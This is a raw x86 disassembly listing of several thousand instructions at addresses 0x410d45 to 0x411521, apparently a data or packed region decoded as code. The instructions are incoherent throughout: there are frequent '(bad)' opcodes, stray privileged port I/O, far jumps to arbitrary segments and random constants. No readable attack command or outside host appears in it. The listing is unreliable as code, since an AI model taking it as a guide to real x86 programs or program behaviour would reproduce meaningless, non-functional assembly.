  410d45:	data16 shl BYTE PTR [ebx+0x5],1
  410d49:	mov    esp,0xd6cc8f4e
  410d4e:	outs   dx,BYTE PTR ds:[esi]
  410d4f:	sub    DWORD PTR [edx+ebx*1-0x310ac3e8],esi
  410d56:	dec    esp
  410d57:	xor    al,0x86
  410d59:	dec    ebp
  410d5a:	jns    0x410d1b
  410d5c:	pop    ecx
  410d5d:	ficomp DWORD PTR [ebp+0x52e54355]
  410d63:	and    DWORD PTR [ecx+0x37],eax
  410d66:	push   ecx
  410d67:	stos   DWORD PTR es:[edi],eax
  410d68:	or     dl,cl
  410d6a:	mov    esp,0xe04a4d86
  410d6f:	cs popf 
  410d71:	je     0x410d32
  410d73:	dec    ebp
  410d74:	(bad)  
  410d75:	adc    eax,0xe1548d6d
  410d7a:	dec    edx
  410d7b:	scas   al,BYTE PTR es:[edi]
  410d7c:	add    eax,DWORD PTR [esi+esi*8+0x7cb0b9e7]
  410d83:	jbe    0x410da4
  410d85:	cmp    eax,0x72ad0156
  410d8a:	call   DWORD PTR [esp+edi*2]
  410d8d:	jge    0x410d16
  410d8f:	or     BYTE PTR [edi+0x62],ch
  410d92:	test   eax,0x529df2b8
  410d97:	out    dx,eax
  410d98:	je     0x410d3a
  410d9a:	xchg   DWORD PTR [ebp+0x2b],esi
  410d9d:	outs   dx,DWORD PTR ds:[esi]
  410d9e:	sbb    dh,ah
  410da0:	or     BYTE PTR [ecx+0x37],bl
  410da3:	push   0xffffffe6
  410da5:	pop    eax
  410da6:	or     eax,eax
  410da8:	hlt    
  410da9:	or     eax,0xa1483015
  410dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410daf:	aas    
  410db0:	mov    DWORD PTR [esi],esp
  410db2:	popa   
  410db3:	xchg   bh,dl
  410db5:	dec    ebx
  410db6:	xor    BYTE PTR [ecx-0x3],dh
  410db9:	mov    eax,0x9588ebeb
  410dbe:	stos   BYTE PTR es:[edi],al
  410dbf:	(bad)  
  410dc0:	(bad)  [edi]
  410dc2:	jg     0x410da2
  410dc4:	aas    
  410dc5:	aad    0xeb
  410dc7:	add    al,0x48
  410dc9:	mov    WORD PTR [edi],fs
  410dcb:	adc    eax,0x161444c8
  410dd0:	pop    eax
  410dd1:	xlat   BYTE PTR ds:[ebx]
  410dd2:	or     esi,DWORD PTR [edx+edx*1-0x7865c130]
  410dd9:	rcr    dh,1
  410ddb:	(bad)
  410ddf:	popf   
  410de0:	xchg   DWORD PTR [edx+0x64e0f3b5],esi
  410de6:	pop    edi
  410de7:	xor    al,0x8c
  410de9:	mov    edi,ebp
  410deb:	cdq    
  410dec:	jae    0x410d93
  410dee:	jb     0x410df7
  410df0:	out    dx,al
  410df1:	or     BYTE PTR [ecx+0x73],0xac
  410df5:	mov    ch,0xd8
  410df7:	fidivr DWORD PTR [ebx+0x76]
  410dfa:	lds    ebx,FWORD PTR [edx-0x3b]
  410dfd:	xchg   bh,dh
  410dff:	push   esp
  410e00:	or     eax,0x6a07de21
  410e05:	(bad)  
  410e06:	push   edi
  410e07:	pop    esp
  410e08:	and    dh,BYTE PTR [ebx-0x58]
  410e0b:	rcl    BYTE PTR [edi],cl
  410e0d:	call   DWORD PTR [ebx-0x74]
  410e10:	scas   al,BYTE PTR es:[edi]
  410e11:	rol    DWORD PTR [ebx],cl
  410e13:	mov    ch,0x77
  410e15:	pop    edi
  410e16:	(bad)  
  410e17:	jg     0x410e3d
  410e19:	and    BYTE PTR [esi+0x10],dh
  410e1c:	or     ch,dh
  410e1e:	mov    ds:0x559a8953,eax
  410e23:	sbb    dh,BYTE PTR [ebx+0x402a94f9]
  410e29:	mov    bh,0x5c
  410e2b:	aam    0x3
  410e2d:	pop    ss
  410e2e:	out    0xe4,eax
  410e30:	sbb    BYTE PTR [ecx-0x5a57f20c],bh
  410e36:	je     0x410e30
  410e38:	add    al,BYTE PTR [edx+ebp*4]
  410e3b:	sbb    DWORD PTR [ebx*2-0x67f32ee7],edx
  410e42:	shl    ebp,1
  410e44:	(bad)  
  410e45:	arpl   WORD PTR [edx+0x226d17b5],sp
  410e4b:	mov    bh,0xde
  410e4d:	int    0xfa
  410e4f:	sahf   
  410e50:	sar    BYTE PTR [ebx+0x34],1
  410e53:	loope  0x410e5a
  410e55:	retf   0x7580
  410e58:	das    
  410e59:	mov    al,0x82
  410e5b:	xchg   ebx,eax
  410e5c:	sbb    al,0x11
  410e5e:	adc    eax,0x4e274921
  410e63:	(bad)  
  410e64:	(bad)  
  410e65:	pop    ebx
  410e66:	ret    
  410e67:	sbb    DWORD PTR [esi+0x66d0ec7a],edx
  410e6d:	sbb    al,0xd3
  410e6f:	push   ss
  410e70:	xchg   BYTE PTR ds:0xf72e9e33,ah
  410e76:	mov    esp,0x623ef4b5
  410e7b:	push   edi
  410e7d:	cmp    ah,BYTE PTR [edx+0x59]
  410e80:	mov    eax,0x98042130
  410e85:	dec    esi
  410e86:	ret    
  410e87:	jns    0x410e12
  410e89:	mov    esp,0x855ded71
  410e8e:	push   ds
  410e8f:	mov    edi,0xa87bdbfe
  410e94:	int3   
  410e95:	sar    esp,0x46
  410e98:	clc    
  410e99:	add    eax,DWORD PTR [eax+0x44ddcce8]
  410e9f:	mov    ds:0x26608d82,eax
  410ea4:	or     al,0xb0
  410ea6:	ja     0x410e39
  410ea8:	fld    QWORD PTR [esi]
  410eaa:	aad    0x8c
  410eac:	das    
  410ead:	cmp    BYTE PTR [edi+0x3bb3a26e],bl
  410eb3:	icebp  
  410eb4:	cmc    
  410eb5:	pusha  
  410eb6:	xor    dh,al
  410eb8:	dec    esp
  410eb9:	pop    ebp
  410eba:	cmp    eax,0xeb54b11e
  410ebf:	cwde   
  410ec0:	icebp  
  410ec1:	ja     0x410f11
  410ec3:	mov    esp,0xe69b73b4
  410ec8:	or     DWORD PTR [ebx+0x62227a42],0xffffffe0
  410ecf:	adc    eax,DWORD PTR [esi]
  410ed1:	ins    BYTE PTR es:[edi],dx
  410ed2:	sub    eax,0xd0fff6c1
  410ed7:	sbb    eax,0x587759ef
  410edc:	in     al,0x7f
  410ede:	cmp    eax,0x41d22a77
  410ee3:	ror    BYTE PTR [edx+eiz*8+0x11212eae],1
  410eea:	aam    0x2
  410eec:	fwait
  410eed:	ins    BYTE PTR es:[edi],dx
  410eee:	pop    es
  410eef:	add    DWORD PTR [ebp-0x73],0xffffffdc
  410ef3:	push   ds
  410ef4:	dec    esi
  410ef5:	dec    DWORD PTR [edi-0x64]
  410ef8:	inc    edx
  410ef9:	cmp    DWORD PTR [edi+0x12626c16],edx
  410eff:	cmp    al,0x6e
  410f01:	imul   ecx,DWORD PTR [ebx-0x12d754d3],0x427ab990
  410f0b:	adc    dh,BYTE PTR [ebx+ecx*2+0x43950653]
  410f12:	sub    DWORD PTR [eax],0x1a
  410f15:	add    DWORD PTR [ecx-0x9],ebx
  410f18:	add    DWORD PTR [ebp+0x52],edi
  410f1b:	out    0xbb,al
  410f1d:	mov    ebp,0xe8a7e466
  410f22:	or     DWORD PTR [ebp-0xc831fad],ebx
  410f28:	or     al,0x12
  410f2a:	push   ss
  410f2b:	fdiv   DWORD PTR [esi+0x5739dbf]
  410f31:	push   ds
  410f32:	push   es
  410f33:	loopne 0x410f9e
  410f35:	pop    eax
  410f36:	xchg   ebp,eax
  410f37:	sbb    ah,cl
  410f39:	in     al,dx
  410f3a:	pop    es
  410f3b:	or     al,0x4f
  410f3d:	cmp    al,0x18
  410f3f:	leave  
  410f40:	ficomp DWORD PTR [ebp-0x47]
  410f43:	jmp    0xae4b:0x93cbe37f
  410f4a:	rcl    BYTE PTR [esi+0x71f1715e],0x4b
  410f51:	dec    edx
  410f52:	mov    ds:0xb5486c34,al
  410f57:	xor    eax,0xadb250a8
  410f5c:	pop    ss
  410f5d:	(bad)  
  410f5e:	iret   
  410f5f:	and    esi,DWORD PTR [edx+ecx*2-0x418ddca0]
  410f66:	mov    ecx,DWORD PTR ds:0x7240e039
  410f6c:	jge    0x410fcb
  410f6e:	(bad)  
  410f6f:	std    
  410f70:	jb     0x410fed
  410f72:	mov    ds:0x454ff708,al
  410f77:	int3   
  410f78:	lea    edi,[edx]
  410f7a:	dec    ecx
  410f7b:	out    dx,eax
  410f7c:	mov    ds:0x322ccadb,eax
  410f81:	loope  0x410f97
  410f83:	push   esi
  410f84:	and    eax,0x71b1c3fc
  410f89:	aaa    
  410f8a:	adc    BYTE PTR [ebx],al
  410f8c:	int3   
  410f8d:	test   BYTE PTR [ebx-0x38],al
  410f90:	push   edi
  410f91:	xchg   ebp,eax
  410f92:	lods   eax,DWORD PTR ds:[esi]
  410f93:	and    BYTE PTR ds:0x75d6ad8a,ah
  410f99:	dec    esi
  410f9a:	xor    eax,0x75052483
  410f9f:	mov    eax,0x7a8dc741
  410fa4:	pop    edx
  410fa5:	mov    bl,0xef
  410fa7:	add    DWORD PTR ds:0x9b087d7a,esp
  410fad:	bound  esi,QWORD PTR [ebp+0x5bc79230]
  410fb3:	xchg   ecx,eax
  410fb4:	jg     0x410fdf
  410fb6:	pop    eax
  410fb7:	add    ecx,eax
  410fb9:	dec    esp
  410fba:	xchg   ecx,eax
  410fbb:	sbb    al,0xa8
  410fbd:	and    ah,BYTE PTR [edx+0x10ec0798]
  410fc3:	xor    ch,BYTE PTR [esi+0x2901bdb8]
  410fc9:	add    BYTE PTR [edx+0x4e],bh
  410fcc:	aaa    
  410fcd:	pop    eax
  410fce:	shl    BYTE PTR [ebp-0x16018013],0xc9
  410fd5:	sbb    ebx,DWORD PTR [edx-0x37]
  410fd8:	pop    ds
  410fd9:	jmp    0xe02756ab
  410fde:	or     al,0x1d
  410fe0:	xchg   ecx,eax
  410fe1:	jne    0x411024
  410fe3:	enter  0x7069,0x64
  410fe7:	ja     0x41100b
  410fe9:	sbb    ecx,DWORD PTR [ebx-0x28]
  410fec:	and    DWORD PTR [eax+0x1eae1108],ecx
  410ff2:	popf   
  410ff3:	call   0xece:0x220f535a
  410ffa:	xchg   edx,eax
  410ffb:	test   ebx,esi
  410ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ffe:	push   cs
  410fff:	scas   al,BYTE PTR es:[edi]
  411000:	je     0x410fb3
  411002:	jbe    0x411062
  411004:	inc    edi
  411005:	fiadd  WORD PTR [ebx+0x52]
  411008:	or     eax,0xb7a13c5a
  41100d:	jg     0x410fd9
  41100f:	stos   DWORD PTR es:[edi],eax
  411010:	cmp    ah,BYTE PTR [eax-0x3b900c94]
  411016:	jecxz  0x410fe3
  411018:	sahf   
  411019:	jmp    0x41100a
  41101b:	inc    ecx
  41101c:	jp     0x41104a
  41101e:	jl     0x410fa2
  411020:	aas    
  411021:	sbb    al,BYTE PTR [ecx+ecx*1-0x54]
  411025:	fist   DWORD PTR [ebx+0x55263b7c]
  41102b:	es sbb dh,dh
  41102e:	and    eax,0xeaf9bd19
  411033:	stc    
  411034:	add    al,0x7f
  411036:	mov    cl,0xd0
  411038:	jge    0x4110a2
  41103a:	jecxz  0x411014
  41103c:	jns    0x41103a
  41103e:	lea    ecx,[edx+ebx*8+0x6f]
  411042:	cmp    al,0x69
  411044:	in     al,0xc8
  411046:	pop    eax
  411047:	scas   eax,DWORD PTR es:[edi]
  411048:	push   ebp
  411049:	jno    0x41108e
  41104b:	mov    DWORD PTR [eax],esp
  41104d:	out    dx,al
  41104e:	jge    0x411093
  411050:	or     ah,ch
  411052:	mov    dh,0x77
  411054:	push   esp
  411055:	mov    DWORD PTR [edi-0x52e2c659],0x70f52b52
  41105f:	ja     0x4110dd
  411061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411062:	outs   dx,BYTE PTR cs:[esi]
  411064:	xor    BYTE PTR [edi-0x3c],ah
  411067:	mov    fs,WORD PTR gs:[esi-0x61]
  41106b:	in     al,dx
  41106c:	cli    
  41106d:	shl    DWORD PTR [esi],0x3a
  411070:	lea    ecx,[ebx]
  411072:	(bad)  
  411073:	aad    0xaa
  411075:	sahf   
  411076:	jae    0x4110b0
  411078:	mov    ebp,0xa2fa22e0
  41107d:	pop    es
  41107e:	pop    ss
  41107f:	loop   0x411073
  411081:	xchg   BYTE PTR [esi+0x4b],bl
  411084:	mov    al,ds:0x5410ad64
  411089:	addr16 add eax,0x2da7d6d3
  41108f:	(bad)
  411093:	push   edi
  411094:	push   edx
  411095:	cld    
  411096:	jo     0x4110b6
  411098:	stos   BYTE PTR es:[edi],al
  411099:	imul   edx,ebx,0xa3ce98f8
  41109f:	xchg   edi,eax
  4110a0:	jmp    0xd2766f0c
  4110a5:	and    al,0x65
  4110a7:	out    0x28,al
  4110a9:	inc    eax
  4110aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110ab:	(bad)  
  4110ac:	mov    ah,0x99
  4110ae:	rcl    BYTE PTR [edx+ebp*4],cl
  4110b1:	test   DWORD PTR [eax+ebx*2],ebp
  4110b4:	fsub   DWORD PTR [esi]
  4110b6:	ficom  DWORD PTR [ebx-0xc7b1702]
  4110bc:	push   edi
  4110bd:	sbb    eax,0xec5549db
  4110c2:	nop
  4110c3:	daa    
  4110c4:	out    dx,al
  4110c5:	push   ebp
  4110c6:	or     DWORD PTR [eax],edi
  4110c8:	mov    bh,0xe4
  4110ca:	fwait
  4110cb:	jne    0x4110c8
  4110cd:	in     eax,0x33
  4110cf:	jp     0x411123
  4110d1:	fisttp DWORD PTR [esi+eiz*4]
  4110d4:	nop
  4110d5:	xchg   esp,eax
  4110d6:	mov    WORD PTR [ebx-0x19],?
  4110d9:	dec    edx
  4110da:	jle    0x411090
  4110dc:	lds    ecx,FWORD PTR [esi]
  4110de:	jbe    0x4110bd
  4110e0:	or     BYTE PTR [esi+0x73be9f34],bh
  4110e6:	xchg   ebp,eax
  4110e7:	jne    0x4110ba
  4110e9:	sbb    eax,0xf1dea660
  4110ee:	cwde   
  4110ef:	push   es
  4110f0:	hlt    
  4110f1:	iret   
  4110f2:	fdivr  DWORD PTR [eax+0x8]
  4110f5:	loope  0x41116b
  4110f7:	pop    esi
  4110f8:	or     BYTE PTR [ebp-0x1e7a2bde],cl
  4110fe:	push   ecx
  4110ff:	pop    eax
  411100:	std    
  411101:	xchg   ecx,eax
  411102:	or     ah,BYTE PTR [edi+0x57eeca9c]
  411108:	rcl    BYTE PTR [esp+eiz*8+0x7c],cl
  41110c:	pop    ebx
  41110d:	inc    esi
  41110e:	cmp    DWORD PTR [esi+0x60ff90e8],ecx
  411114:	pushf  
  411115:	inc    ebx
  411116:	dec    esp
  411117:	or     al,0x26
  411119:	mov    ?,WORD PTR [edi+0x42]
  41111c:	bound  esi,QWORD PTR [edx]
  41111e:	jne    0x41112c
  411120:	stc    
  411121:	shl    BYTE PTR [ebp+0x43],0x17
  411125:	adc    eax,0xc4737cc4
  41112a:	(bad)  
  41112b:	in     al,0x4f
  41112d:	adc    BYTE PTR [ecx-0x55d6122],bl
  411133:	sbb    BYTE PTR [ebx-0x39],0x6
  411137:	in     eax,dx
  411138:	xor    ebp,edi
  41113a:	xchg   ebp,eax
  41113b:	out    dx,al
  41113c:	daa    
  41113d:	add    BYTE PTR [esi+0x6c],0x9
  411141:	(bad)  
  411142:	mov    al,ds:0xe7cfcce7
  411147:	jb     0x411179
  411149:	xchg   esi,eax
  41114a:	lods   eax,DWORD PTR ds:[esi]
  41114b:	cld    
  41114c:	imul   ebp,DWORD PTR [eax+0x1991a131],0xfe0102dd
  411156:	das    
  411157:	pop    eax
  411158:	int3   
  411159:	fdivr  st,st(0)
  41115b:	and    DWORD PTR [esi-0x8edbe89],edx
  411161:	not    DWORD PTR [ebx]
  411163:	jp     0x41111e
  411165:	das    
  411166:	jle    0x4111af
  411168:	mov    ch,0xcb
  41116a:	popa   
  41116b:	cmp    DWORD PTR [ebx+0x442e62f4],edi
  411171:	div    BYTE PTR [edi-0x74]
  411174:	sbb    BYTE PTR [ecx+0x34],cl
  411177:	sbb    al,0x87
  411179:	push   edi
  41117a:	mov    edi,0x4555a570
  41117f:	sbb    BYTE PTR [ebx+0x7c],0x53
  411183:	ja     0x411140
  411185:	mov    ecx,0xda020e2d
  41118a:	stc    
  41118b:	inc    edi
  41118c:	test   al,0xd2
  41118e:	sub    dl,cl
  411190:	cmp    al,0xc6
  411192:	repz out 0xb4,al
  411195:	xchg   esp,eax
  411196:	inc    edx
  411197:	scas   al,BYTE PTR es:[edi]
  411198:	or     al,0x72
  41119a:	mov    esp,0x4aa0d6ac
  41119f:	xor    DWORD PTR [esi-0xae5c555],esp
  4111a5:	(bad)  
  4111a7:	push   0x247c3089
  4111ac:	cmp    BYTE PTR ds:0xba6b832e,0xdb
  4111b3:	fisub  DWORD PTR [ebx+ebp*4+0x5b]
  4111b7:	xchg   ebp,eax
  4111b8:	jae    0x411216
  4111ba:	add    DWORD PTR [ebp-0x39],ebp
  4111bd:	ror    ebx,0xc3
  4111c0:	and    eax,0x25405eb6
  4111c5:	mov    dl,0x5f
  4111c7:	loop   0x411210
  4111c9:	fsub   st,st(3)
  4111cb:	push   ebx
  4111cc:	lahf   
  4111cd:	mov    ebp,0xb7c3880e
  4111d2:	stos   BYTE PTR es:[edi],al
  4111d3:	mov    eax,ds:0x66ea24d9
  4111d8:	sub    eax,0xa9e81d91
  4111dd:	int3   
  4111de:	and    dh,BYTE PTR [esi+0x2]
  4111e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111e2:	stos   DWORD PTR es:[edi],eax
  4111e3:	(bad)  
  4111e4:	jnp    0x4111e3
  4111e6:	mov    ch,BYTE PTR [ebp+0x76]
  4111e9:	in     eax,0x13
  4111eb:	leave  
  4111ec:	mov    ebp,0x6c855281
  4111f1:	jmp    0xefa1:0x78e6eeb7
  4111f8:	pushf  
  4111f9:	daa    
  4111fa:	dec    ebx
  4111fb:	push   DWORD PTR [ecx]
  4111fd:	sbb    cl,cl
  4111ff:	imul   ecx,ebp,0xffffffe8
  411202:	mov    al,ds:0x2cdd2ad1
  411207:	(bad)  
  411208:	icebp  
  411209:	scas   eax,DWORD PTR es:[edi]
  41120a:	xchg   ecx,eax
  41120b:	iret   
  41120c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41120d:	or     esp,ebx
  41120f:	mov    ebx,0xde78ba1b
  411214:	in     al,dx
  411215:	repz ror ah,0x31
  411219:	or     ebx,edx
  41121b:	loope  0x4111bd
  41121d:	inc    edx
  41121e:	push   0xffffff9c
  411220:	popf   
  411221:	sbb    ch,bl
  411223:	(bad)  
  411224:	loop   0x4111cb
  411226:	sub    ecx,ebx
  411228:	js     0x41125b
  41122a:	cmp    al,0x93
  41122c:	sti    
  41122d:	(bad)  [esi]
  41122f:	fst    QWORD PTR [ecx-0x496230c1]
  411235:	scas   al,BYTE PTR es:[edi]
  411236:	pusha  
  411237:	mov    eax,0x46644f04
  41123c:	addr16 aam 0xfa
  41123f:	ret    0x74a
  411242:	(bad)  
  411243:	mov    dh,0xe
  411245:	dec    edi
  411246:	inc    ebx
  411247:	fisub  DWORD PTR [edx-0x60]
  41124a:	fwait
  41124b:	ins    BYTE PTR es:[edi],dx
  41124c:	and    eax,0xca249130
  411251:	arpl   WORD PTR [ecx],ax
  411253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411254:	adc    edi,DWORD PTR [edi+0x3e406c06]
  41125a:	lods   al,BYTE PTR ds:[esi]
  41125b:	pusha  
  41125c:	fistp  DWORD PTR [esi-0x26]
  41125f:	add    edx,eax
  411261:	sbb    bl,BYTE PTR [ecx]
  411263:	pop    es
  411264:	xchg   ebp,eax
  411265:	(bad)  
  411266:	cmp    ecx,DWORD PTR [edi+0x3d]
  411269:	leave  
  41126a:	mov    dl,0x98
  41126c:	dec    ebx
  41126d:	push   ebp
  41126e:	dec    edi
  41126f:	arpl   bp,di
  411271:	push   es
  411272:	stc    
  411273:	sbb    al,0xab
  411275:	dec    edx
  411276:	pop    esi
  411277:	call   0x4abb6ad5
  41127c:	retf   0x3de9
  41127f:	dec    edi
  411280:	xchg   ebp,eax
  411281:	and    ah,BYTE PTR [ebx+0x3e582af8]
  411287:	pop    ecx
  411288:	jl     0x4112ad
  41128a:	push   0xae12c2f7
  41128f:	lock jmp 0xe6d0:0xbc6ffb3
  411297:	jle    0x41130f
  411299:	lahf   
  41129a:	mov    ch,0x80
  41129c:	mov    es,WORD PTR [ebx+0x603f9251]
  4112a2:	arpl   WORD PTR [ecx+edx*4+0x254472f],si
  4112a9:	lahf   
  4112aa:	fdiv   QWORD PTR [edi]
  4112ac:	inc    edx
  4112ad:	adc    al,0x47
  4112af:	inc    DWORD PTR [edx-0x59f090db]
  4112b5:	mov    ah,0xce
  4112b7:	jbe    0x411280
  4112b9:	xchg   esp,eax
  4112ba:	test   BYTE PTR [esi-0x40],ch
  4112bd:	pop    DWORD PTR [edi]
  4112bf:	fist   DWORD PTR [ebp+0x1c]
  4112c2:	int3   
  4112c3:	outs   dx,DWORD PTR ds:[esi]
  4112c4:	xchg   DWORD PTR [edi+0x63],esi
  4112c7:	mov    bh,0x11
  4112c9:	fwait
  4112ca:	rcl    DWORD PTR [eax+0x6576bf55],cl
  4112d0:	mov    DWORD PTR [eax-0x4b2510a3],ecx
  4112d6:	icebp  
  4112d7:	loopne 0x4112fb
  4112d9:	pop    ds
  4112da:	or     dl,dh
  4112dc:	mov    ah,BYTE PTR [ecx]
  4112de:	mov    ah,0xc1
  4112e0:	shr    BYTE PTR [ecx+0x78],0x43
  4112e4:	inc    esp
  4112e5:	clc    
  4112e6:	ins    BYTE PTR es:[edi],dx
  4112e7:	mov    ecx,0x45c4925
  4112ec:	jo     0x4112f6
  4112ee:	push   es
  4112ef:	aad    0x95
  4112f1:	add    eax,0x1eaf9e1d
  4112f6:	or     al,0x4e
  4112f8:	mov    esp,0xded061da
  4112fd:	add    ebx,DWORD PTR [ebx]
  4112ff:	outs   dx,BYTE PTR ds:[esi]
  411300:	pop    esi
  411301:	retf   
  411302:	mov    edi,0x9c4dc64e
  411307:	arpl   WORD PTR [ecx+0x33],ax
  41130a:	test   BYTE PTR [edx+0x29d495cd],0x2d
  411311:	xor    eax,DWORD PTR [edi+ebx*4]
  411314:	xor    eax,0x3123eb0e
  411319:	jae    0x41129d
  41131b:	retf   0x1c1f
  41131e:	nop
  41131f:	aas    
  411320:	add    bh,BYTE PTR [ebx+esi*8+0x5c]
  411324:	shld   DWORD PTR [edx+0x61],esp,cl
  411328:	pop    esp
  411329:	pusha  
  41132a:	sub    al,0xb9
  41132c:	mov    al,0x86
  41132e:	in     al,dx
  41132f:	fdivr  QWORD PTR [edx]
  411331:	inc    esi
  411332:	jns    0x41133e
  411334:	fnsave [edx-0x2e]
  411337:	mov    ebx,0xbfed400
  41133c:	sub    BYTE PTR [ebx+eiz*1-0x79],bl
  411340:	outs   dx,BYTE PTR ds:[esi]
  411341:	push   ds
  411342:	cli    
  411343:	mov    dl,0xd8
  411345:	add    eax,0xb47a0147
  41134a:	jecxz  0x4113c9
  41134c:	js     0x4112e4
  41134e:	out    0x88,al
  411350:	leave  
  411351:	pop    ebp
  411352:	int3   
  411353:	inc    edi
  411354:	sti    
  411355:	sub    cl,BYTE PTR [eax+0x39da3450]
  41135b:	cs or  al,0x3f
  41135e:	push   ebp
  41135f:	sub    ebp,DWORD PTR [esi-0x2f43c9e5]
  411365:	sub    dl,BYTE PTR [ebx]
  411367:	gs aad 0x29
  41136a:	mov    edx,0xd3b1b1a8
  41136f:	xor    BYTE PTR [esi+0x3e],0x80
  411373:	cmp    eax,0x1eb1b503
  411378:	loop   0x411322
  41137a:	in     al,dx
  41137b:	push   ebx
  41137c:	or     eax,0x553ab7c5
  411381:	shr    DWORD PTR [eax],1
  411383:	das    
  411384:	mov    al,ds:0xf3b137cc
  411389:	sub    esi,DWORD PTR fs:[ecx-0xb]
  41138d:	jmp    0x41137a
  41138f:	ret    0x547b
  411392:	add    edx,ebp
  411394:	jg     0x4113b2
  411396:	inc    esp
  411397:	add    BYTE PTR [ebx+0x2f636b29],ch
  41139d:	add    esi,DWORD PTR [eax]
  41139f:	mov    esp,0x51eac818
  4113a4:	in     al,dx
  4113a5:	rol    DWORD PTR [eax+eiz*8-0x7b],1
  4113a9:	mov    ebp,0x51f6ac98
  4113ae:	clc    
  4113af:	and    cl,BYTE PTR [ebp-0x9]
  4113b2:	inc    esi
  4113b3:	push   ebx
  4113b4:	in     al,dx
  4113b5:	lods   al,BYTE PTR ds:[esi]
  4113b6:	sub    dl,BYTE PTR [eax-0x32a9cf48]
  4113bc:	ret    
  4113bd:	arpl   WORD PTR [esi-0x6a0a51c7],dx
  4113c3:	(bad)  
  4113c4:	mov    bl,0xaa
  4113c6:	aas    
  4113c7:	imul   edi,ebp,0xfb63e2fe
  4113cd:	sbb    DWORD PTR [ebx-0x4c0be69a],0x63
  4113d4:	data16 scas al,BYTE PTR es:[edi]
  4113d6:	jmp    0xeffcd262
  4113db:	push   edi
  4113dc:	dec    edi
  4113dd:	xor    BYTE PTR [esi+eax*2],ch
  4113e0:	dec    ecx
  4113e1:	and    eax,0x1f753a8e
  4113e6:	jae    0x411435
  4113e8:	pop    eax
  4113e9:	fs dec esp
  4113eb:	(bad)  
  4113ec:	mov    ebx,0x3d062468
  4113f1:	push   es
  4113f2:	push   ebp
  4113f4:	cmc    
  4113f5:	std    
  4113f6:	add    bh,bl
  4113f8:	cli    
  4113f9:	shl    DWORD PTR [edx],0x44
  4113fc:	test   BYTE PTR [eax],bh
  4113fe:	sbb    eax,0x32243762
  411403:	xchg   bh,dl
  411405:	xchg   ebx,eax
  411406:	les    edi,FWORD PTR [ebx]
  411408:	call   0x6fe25938
  41140d:	push   cs
  41140e:	jb     0x41146d
  411410:	lds    ebp,FWORD PTR [ebx+0x56]
  411413:	(bad)  
  411414:	out    dx,al
  411415:	mov    edi,0x6c5459f4
  41141a:	pushf  
  41141b:	cs xchg esi,eax
  41141d:	arpl   di,ax
  41141f:	and    DWORD PTR [edi],ebp
  411421:	loopne 0x4113ef
  411423:	mov    ds:0x50777806,al
  411428:	inc    ebx
  411429:	push   cs
  41142a:	fistp  WORD PTR [edx]
  41142c:	mov    ds:0xf0c32561,eax
  411431:	ins    DWORD PTR es:[edi],dx
  411432:	popa   
  411433:	sbb    esp,eax
  411435:	loop   0x411472
  411437:	xchg   BYTE PTR [ebp+0x429d101e],al
  41143d:	repz pusha 
  41143f:	sbb    bh,BYTE PTR [edi+0x76b005ff]
  411445:	cwde   
  411446:	mov    eax,0x28cb9e79
  41144b:	fild   DWORD PTR [edi]
  41144d:	dec    eax
  41144e:	and    ebp,DWORD PTR [ebx]
  411450:	stos   BYTE PTR es:[edi],al
  411451:	popf   
  411452:	in     eax,dx
  411453:	(bad)  
  411454:	push   0x21
  411456:	fisub  WORD PTR fs:[ebp+0x2f]
  41145a:	out    0x9d,al
  41145c:	inc    ebp
  41145d:	inc    eax
  41145e:	ds jmp 0xec93:0x9b395c22
  411466:	loopne 0x4114d0
  411468:	cld    
  411469:	or     al,0x87
  41146b:	out    0x38,eax
  41146d:	je     0x4114c2
  41146f:	inc    ecx
  411470:	inc    esi
  411471:	data16 je 0x411436
  411474:	hlt    
  411475:	into   
  411476:	mov    bl,0xb7
  411478:	ret    
  411479:	shr    BYTE PTR [esp+eiz*8+0x6],1
  41147d:	fdivr  st(7),st
  41147f:	add    BYTE PTR [eax],ah
  411481:	adc    ah,ah
  411483:	dec    ebp
  411484:	xor    al,0x77
  411486:	aam    0x82
  411488:	mov    al,0x24
  41148a:	ins    DWORD PTR es:[edi],dx
  41148b:	and    esp,esp
  41148d:	ficom  WORD PTR [eax]
  41148f:	mov    al,ds:0x9471fa04
  411494:	mov    ecx,0xec39ae4b
  411499:	cwde   
  41149a:	aad    0xbc
  41149c:	push   ss
  41149d:	mov    esi,0xe4509567
  4114a2:	or     BYTE PTR [ecx+edx*1-0x5ee2df21],al
  4114a9:	mov    edi,0xe2628990
  4114ae:	popa   
  4114af:	pusha  
  4114b0:	lods   eax,DWORD PTR ds:[esi]
  4114b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b2:	or     BYTE PTR [ecx-0x7f0caa46],0x30
  4114b9:	and    BYTE PTR [ebx+0x6d],0x84
  4114bd:	or     al,0x25
  4114bf:	dec    edx
  4114c0:	js     0x4114dd
  4114c2:	mov    ecx,0x9ef4db2
  4114c7:	test   al,0xda
  4114c9:	and    ebp,ecx
  4114cb:	stos   DWORD PTR es:[edi],eax
  4114cc:	repnz mov cl,0xbd
  4114cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d0:	test   BYTE PTR [ebp+esi*2-0x4dc67a8],dl
  4114d7:	int    0x30
  4114d9:	or     ah,BYTE PTR [ebp+0x4e]
  4114dc:	mov    al,ds:0x747b0ff1
  4114e1:	stos   BYTE PTR es:[edi],al
  4114e2:	mov    dl,0xc8
  4114e4:	bnd jno 0x4114a4
  4114e7:	mov    es,WORD PTR [ebx+edi*8-0x7e816a88]
  4114ee:	xchg   edi,eax
  4114ef:	pop    ecx
  4114f0:	xchg   ebp,eax
  4114f1:	es jmp 0x68f:0x4ecc302c
  4114f9:	aas    
  4114fa:	pop    ss
  4114fb:	call   0x1e951f67
  411500:	mov    edi,0x4b94aab3
  411505:	mov    ?,WORD PTR [edi]
  411507:	lods   al,BYTE PTR ds:[esi]
  411508:	cmp    BYTE PTR [ebx-0x69],bl
  41150b:	out    0xc1,al
  41150d:	xchg   esi,eax
  41150e:	inc    esi
  41150f:	pop    ecx
  411510:	sub    BYTE PTR [ecx+0x7cc54991],bl
  411516:	test   eax,0x9fa3d084
  41151b:	bound  esi,QWORD PTR [ebp+0x6ffb7bd9]
  411521:	hlt    
